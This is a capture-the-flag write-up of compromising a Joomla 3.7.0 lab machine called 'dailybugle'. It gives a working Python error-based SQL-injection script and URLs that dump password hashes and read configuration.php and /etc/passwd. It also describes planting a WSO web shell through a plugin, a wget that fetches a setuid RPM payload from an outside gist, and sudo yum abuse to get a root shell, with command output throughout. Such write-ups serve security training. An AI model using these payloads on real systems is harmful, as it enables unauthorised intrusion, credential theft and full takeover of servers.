# dailybugle
So we have a joomla over here.

Let's check the version and will google for exploits.

http://10.10.33.156/language/en-GB/en-GB.xml
```
<version>3.7.0</version>
```
We found https://www.exploit-db.com/exploits/42033 sql injection (Error based, much better to use).

So we exploited SQLi error based easily (Used substring because ExtractValue can show only 32 chars).
```
import requests
import re

url = "http://10.10.33.156/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=(extractvalue(1,concat(0x3a,(select [SQL]))))"

def makeRequest(query):
	global url
	exploitURL = url.replace('[SQL]',query)
	r = requests.get(exploitURL)
	result = re.search(r'<title>(.*)<\/title>',r.text)
	return result.group(0)

print(makeRequest('substring((select password from %23__users limit 0,1), 30, 31)'))
```
Brutforced a password using john, not a big deal. 

Got a password for /administrator/: SomeUser:batman987 :) (this is not real password and not real user, you need to do it yourself)

<b>Way 1 (Lazy a not C00lH4CK3R way)</b>
	Now we need to add WSO shell to our plugin:
  
  I downloaded random plugin from joomla off site, added wso.php to plugin directory, added <filename>wso.php</filename> to <files> into [plugin_name].xml
  
	http://10.10.33.156/plugins/system/[plugin_name]/wso.php
  
  and just reading configuration.php and trying to use mysql password for jjameson user (we already checked /home/ directory before)

<b>Way 2:</b>
Just use SQLI to obtain MySQL password:
```
	http://10.10.33.156/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=(extractvalue(1,concat(0x3a,(select%20substring(load_file(0x2f7661722f7777772f68746d6c2f636f6e66696775726174696f6e2e706870),480,31)))))
  ```
  So we have our mysql password. 
  We cant connect to mysql because its binded to 127.0.0.1, but we still can read /etc/passwd:
  
	http://10.10.33.156/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=(extractvalue(1,concat(0x3a,(select%20substring(load_file(0x2f6574632f706173737764),870,31)))))

	:nah Jameson:/home/jjameson:/bin
  
  Trying to use mysql password and we got ssh access. 
 
<b>Gaining root privileges</b>

So, we have tip about yum, lets explore.
sudo -l:
```
User jjameson may run the following commands on dailybugle:
    (ALL) NOPASSWD: /usr/bin/yum
```
So we have root privileges to yum which creates root setUID executable, lets try to make sudo yum installocal rootbackdor
We already have rootbackdoor compiled and ready to use ( https://lsdsecurity.com/2019/01/more-linux-privilege-escalation-yum-rpm-dnf-nopasswd-rpm-payloads/ )
```
wget https://gist.githubusercontent.com/neoice/797777cb0832f596a70b6cba7bbbcc4f/raw/f3f94e105c23d2c01706736d9cd729dd555e9c53/setuid-pop.rpm
```
(Actually wont work because tryhack VM is closed to internet)
So we have setuid-pop.rpm, lets extract it to binary 
```
cat setuid-pop.rpm|base64 -d|gzip -d > exploit.rpm

sudo yum localinstall exploit.rpm

...
Installed:
  sploit.x86_64 0:1.0-1                                                         

Complete!

cd /usr/local/bin

ls -la
total 12
drwxr-xr-x.  2 root root   17 Mar 27 05:53 .
drwxr-xr-x. 12 root root  131 Dec 14 13:57 ..
-rwsr-sr-x   1 root root 8744 Jan 18  2019 pop
```

So lets just run it
```
[jjameson@dailybugle bin]$ ./pop
[root@dailybugle bin]# id
uid=0(root) gid=0(root) groups=0(root),1000(jjameson)
```
Thats it. Grabbing all flags from jjameson and root and we are good to go.
